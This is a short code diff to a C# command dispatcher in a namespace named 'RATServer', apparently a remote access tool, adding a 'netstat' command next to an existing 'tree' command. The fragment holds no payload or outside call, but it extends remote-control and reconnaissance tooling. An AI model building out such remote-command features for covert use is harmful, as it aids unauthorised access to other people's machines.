@@ -115,6 +115,9 @@ namespace RATServer
                         case "tree":
                             r = Functions.Tree(c.Args[0]);
                             break;
+                        case "netstat":
+                            r = Functions.NetStat();
+                            break;
                         default:
                             break;
                     }                 
